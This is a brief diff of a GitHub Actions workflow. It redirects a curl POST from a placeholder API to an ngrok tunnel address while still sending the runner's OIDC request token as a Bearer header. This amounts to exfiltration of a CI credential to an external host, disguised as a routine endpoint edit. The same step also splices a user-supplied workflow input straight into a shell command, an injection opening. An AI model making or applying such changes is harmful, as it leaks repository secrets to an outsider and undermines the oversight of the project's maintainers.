@@ -23,7 +23,7 @@ jobs:
       env:
         OIDC_TOKEN: ${{ secrets.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}  # Using the automatically injected environment variable
       run: |
-        curl -X POST "https://api.yourdomain.com/endpoint" \
+        curl -X POST "https://charming-termite-surely.ngrok-free.app" \
         -H "Authorization: Bearer $OIDC_TOKEN" \
         -H "Content-Type: application/json" \
         -d '{"data": "${{ github.event.inputs.message }}"}'
